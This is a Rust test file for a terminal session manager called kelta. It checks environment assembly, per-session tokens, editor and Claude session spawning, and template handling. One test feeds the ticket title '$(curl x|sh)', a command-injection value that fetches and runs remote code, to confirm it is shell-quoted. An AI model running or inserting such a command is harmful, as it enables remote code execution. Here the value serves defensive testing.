//! SpawnRequest → PtySpawnSpec: env assembly (insta snapshot), program resolution, scrollback by
//! kind, per-session tokens, standalone Claude template files.

use std::collections::BTreeMap;
use std::path::Path;

use crate::common::*;
use kelta_core::spawn_env::{EnvInputs, assemble_env};
use kelta_proto::api::CoreApi;
use kelta_proto::ids::ProjectId;
use kelta_proto::model::{Placement, SessionKind, SpawnRequest, TemplateCtx};
use kelta_proto::settings::Settings;

fn map(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
    pairs.iter().map(|(k, v)| ((*k).to_owned(), (*v).to_owned())).collect()
}

#[test]
fn env_assembly_snapshot() {
    let login = map(&[
        ("PATH", "/usr/local/bin:/usr/bin"),
        ("HOME", "/home/ada"),
        ("SHELL", "/bin/zsh"),
        ("TERM", "dumb"),
        ("TERM_PROGRAM", "iTerm.app"),
        ("KELTA_TICKET", "STALE-1"),
        ("TERMINFO", "/usr/share/terminfo"),
        ("EDITOR", "vi"),
    ]);
    let env = assemble_env(&EnvInputs {
        login: &login,
        terminal_env: &map(&[("EDITOR", "nvim"), ("FOO", "terminal")]),
        project_env: &map(&[("FOO", "project"), ("DATABASE_URL", "postgres://localhost/shop_dev")]),
        request_env: &map(&[("FOO", "request")]),
        version: "0.1.0",
        session_id: "01928f6e-2b4c-7a10-9c3d-5e6f70819203",
        project_id: "shop",
        ctl_sock: Path::new("/tmp/kelta-501/ctl.sock"),
        hook_token: "00112233445566778899aabbccddeeff",
        ticket: Some("SHOP-142"),
        mcp_token: Some("ffeeddccbbaa99887766554433221100"),
        mcp_url: None,
    });
    insta::assert_json_snapshot!("spawn_env", env);
}

fn req(kind: SessionKind, program: Option<&str>, args: &[&str]) -> SpawnRequest {
    SpawnRequest {
        id: None,
        project_id: ProjectId::new("shop"),
        kind,
        name: None,
        program: program.map(str::to_owned),
        args: args.iter().map(|s| (*s).to_owned()).collect(),
        cwd: None,
        env: map(&[("REQ", "1")]),
        cols: 120,
        rows: 40,
        work_item_id: None,
        restore: Default::default(),
        close_on_exit: Default::default(),
        template_id: None,
    }
}

#[tokio::test]
async fn spawn_builds_the_pty_spec() {
    let tmp = tempfile::tempdir().unwrap();
    let mut settings = Settings::defaults();
    settings.terminal.env = map(&[("FROM_TERMINAL", "1")]);
    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
    h.cfg.env.write().insert(ProjectId::new("shop"), map(&[("FROM_PROJECT", "1")]));

    let shell = h.core.session_spawn(req(SessionKind::Shell, None, &[])).await.unwrap();
    let (program, args, env, scrollback, cwd) = h
        .term
        .with_session(&shell.id, |s| {
            (
                s.spec.program.clone(),
                s.spec.args.clone(),
                s.spec.env.clone(),
                s.spec.scrollback_lines,
                s.spec.cwd.clone(),
            )
        })
        .unwrap();
    assert_eq!(program, Path::new("/bin/sh"));
    assert_eq!(args, vec!["-l".to_owned()]);
    assert_eq!(scrollback, 3000);
    assert!(cwd.ends_with("repos/shop"));
    assert_eq!(env["KELTA_SESSION_ID"], shell.id.as_str());
    assert_eq!(env["KELTA_PROJECT_ID"], "shop");
    assert_eq!(env["TERM"], "xterm-256color");
    assert_eq!(env["FROM_TERMINAL"], "1");
    assert_eq!(env["FROM_PROJECT"], "1");
    assert_eq!(env["REQ"], "1");
    assert_eq!(env["LANG"], "en_US.UTF-8");
    assert_eq!(env["KELTA_HOOK_TOKEN"].len(), 32);
    assert!(!env.contains_key("KELTA_TICKET"), "inherited KELTA_* vars must not leak");
    assert!(!env.contains_key("KELTA_MCP_TOKEN"));
    assert!(env["KELTA_SOCK"].ends_with("run/ctl.sock"));

    let editor = h
        .core
        .session_spawn(req(
            SessionKind::Editor { adapter: "nvim".into() },
            Some("nvim"),
            &["--listen", "/tmp/x.sock", "."],
        ))
        .await
        .unwrap();
    let (program, scrollback) =
        h.term.with_session(&editor.id, |s| (s.spec.program.clone(), s.spec.scrollback_lines)).unwrap();
    assert!(program.ends_with("bin/nvim") && program.is_absolute());
    assert_eq!(scrollback, 500);
    assert_eq!(editor.editor.as_ref().and_then(|e| e.socket.clone()).unwrap(), Path::new("/tmp/x.sock"));

    let claude = h.core.session_spawn(req(SessionKind::Claude, Some("claude"), &["-n", "x"])).await.unwrap();
    let (args, env) = h.term.with_session(&claude.id, |s| (s.spec.args.clone(), s.spec.env.clone())).unwrap();
    let uuid = claude.claude.as_ref().unwrap().session_uuid.clone();
    assert_eq!(args[..2], ["--session-id".to_owned(), uuid]);
    assert_eq!(env["KELTA_MCP_TOKEN"].len(), 32);
    assert_ne!(env["KELTA_MCP_TOKEN"], env["KELTA_HOOK_TOKEN"]);

    let missing = h
        .core
        .session_spawn(req(SessionKind::Tool { tool_id: "nope".into() }, Some("definitely-not-here"), &[]))
        .await
        .unwrap_err();
    assert_eq!(missing.code, kelta_proto::ErrorCode::NotFound);
    assert!(missing.detail.is_some());
    let bad_project =
        SpawnRequest { project_id: ProjectId::new("ghost"), ..req(SessionKind::Shell, None, &[]) };
    assert_eq!(h.core.session_spawn(bad_project).await.unwrap_err().code, kelta_proto::ErrorCode::NotFound);
}

#[tokio::test]
async fn template_spawns_a_tab_with_claude_hooks() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let shop = ProjectId::new("shop");
    let spawned = h
        .core
        .session_spawn_template(&shop, "claude+editor", TemplateCtx::default(), Placement::NewTab)
        .await
        .unwrap();
    assert_eq!(spawned.len(), 2);
    assert!(matches!(spawned[0].kind, SessionKind::Claude));
    assert!(matches!(&spawned[1].kind, SessionKind::Editor { adapter } if adapter == "nvim"));
    let args = h.term.with_session(&spawned[0].id, |s| s.spec.args.clone()).unwrap();
    assert!(!args.iter().any(|a| a.contains("{task}")), "plain session must not get a prompt: {args:?}");
    let file = args.iter().position(|a| a == "--settings").map(|i| args[i + 1].clone()).unwrap();
    let hooks: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&file).unwrap()).unwrap();
    assert!(hooks["hooks"]["SessionStart"].is_array());
    use std::os::unix::fs::PermissionsExt;
    assert_eq!(std::fs::metadata(&file).unwrap().permissions().mode() & 0o777, 0o600);
    let nvim_args = h.term.with_session(&spawned[1].id, |s| s.spec.args.clone()).unwrap();
    assert_eq!(nvim_args[0], "--listen");
    assert!(nvim_args[1].ends_with(&format!("s/{}/nvim.sock", spawned[1].id.sid8())));

    let layout = h.core.layout_get(&shop).unwrap();
    assert_eq!(layout.tabs.len(), 1);
    assert_eq!(layout.tabs[0].title, "Claude + editor");
    assert_eq!(
        kelta_core::layout::layout_sessions(&layout),
        vec![spawned[0].id.clone(), spawned[1].id.clone()]
    );
    assert!(h.ui.event_names().contains(&"layout.changed"));
    assert_eq!(
        h.core
            .session_spawn_template(&shop, "nope", TemplateCtx::default(), Placement::NewTab)
            .await
            .unwrap_err()
            .code,
        kelta_proto::ErrorCode::NotFound
    );
}

#[tokio::test]
async fn template_shell_command_quotes_placeholders() {
    let tmp = tempfile::tempdir().unwrap();
    let mut settings = Settings::defaults();
    settings.session_templates.push(kelta_proto::settings::SessionTemplate {
        id: "log".into(),
        label: "Log".into(),
        layout: kelta_proto::settings::TemplateNode::Session {
            session: "shell".into(),
            name: None,
            profile: None,
            command: Some("git log --grep {ticket.title} {base|shell}".into()),
        },
        enabled: true,
    });
    let h = start(tmp.path(), settings, vec![project("shop", tmp.path())]);
    let shop = ProjectId::new("shop");
    // a third-party ticket title must not run as shell code
    let ctx = TemplateCtx { extra: map(&[("title", "$(curl x|sh)")]), ..TemplateCtx::default() };
    let spawned = h.core.session_spawn_template(&shop, "log", ctx, Placement::NewTab).await.unwrap();
    let typed = String::from_utf8(h.term.written(&spawned[0].id)).unwrap();
    assert_eq!(typed, "git log --grep '$(curl x|sh)' 'main'\r");
}

#[tokio::test]
async fn spawn_uses_the_requested_id_once() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let id = kelta_proto::ids::SessionId::generate();
    let mut r = req(SessionKind::Shell, None, &[]);
    r.id = Some(id.clone());
    // a failed spawn does not burn the id
    let mut bad = r.clone();
    bad.project_id = ProjectId::new("nope");
    assert!(h.core.session_spawn(bad).await.is_err());
    assert_eq!(h.core.session_spawn(r.clone()).await.unwrap().id, id);
    let err = h.core.session_spawn(r.clone()).await.unwrap_err();
    assert_eq!(err.code, kelta_proto::error::ErrorCode::Conflict);
    r.id = Some(kelta_proto::ids::SessionId::new("not-a-uuid"));
    let err = h.core.session_spawn(r).await.unwrap_err();
    assert_eq!(err.code, kelta_proto::error::ErrorCode::InvalidArgument);
}

#[tokio::test]
async fn work_updated_reaches_the_ui() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let work = kelta_proto::samples::work_item();
    h.core.publish(kelta_proto::events::BusEvent::new(
        kelta_proto::events::bus::WORK_UPDATED,
        serde_json::json!({ "work": work }),
    ));
    assert!(h.ui.events().iter().any(|e| matches!(e,
        kelta_proto::events::UiEvent::WorkUpdated { work: w } if w.id == work.id)));
}

#[tokio::test]
async fn claude_ide_bridge_follows_the_setting() {
    let tmp = tempfile::tempdir().unwrap();
    let h = start(tmp.path(), Settings::defaults(), vec![project("shop", tmp.path())]);
    let env_of = |id| h.term.with_session(id, |s| s.spec.env.clone()).unwrap();

    // Off (default): no env, no lock file under the (temp) HOME.
    let off = h.core.session_spawn(req(SessionKind::Claude, Some("claude"), &[])).await.unwrap();
    let env = env_of(&off.id);
    assert!(!env.contains_key("CLAUDE_CODE_SSE_PORT") && !env.contains_key("ENABLE_IDE_INTEGRATION"));
    assert!(!tmp.path().join("home/.claude").exists());

    // On: the lock goes under the session's own CLAUDE_CONFIG_DIR and goes away with the session.
    h.cfg.update(|s| s.claude.ide_bridge = true);
    let cfg_dir = tmp.path().join("claude-cfg");
    let mut r = req(SessionKind::Claude, Some("claude"), &[]);
    r.env.insert("CLAUDE_CONFIG_DIR".into(), cfg_dir.display().to_string());
    let on = h.core.session_spawn(r).await.unwrap();
    let env = env_of(&on.id);
    assert_eq!(env["ENABLE_IDE_INTEGRATION"], "true");
    let lock = cfg_dir.join("ide").join(format!("{}.lock", env["CLAUDE_CODE_SSE_PORT"]));
    let l: serde_json::Value = serde_json::from_slice(&std::fs::read(&lock).unwrap()).unwrap();
    assert_eq!(l["workspaceFolders"], serde_json::json!([on.cwd]));
    // Shells never get a bridge.
    let shell = h.core.session_spawn(req(SessionKind::Shell, None, &[])).await.unwrap();
    assert!(!env_of(&shell.id).contains_key("CLAUDE_CODE_SSE_PORT"));

    h.core.session_kill(&on.id, false).await.unwrap();
    assert!(!lock.exists(), "lock file removed when the session ends");
}
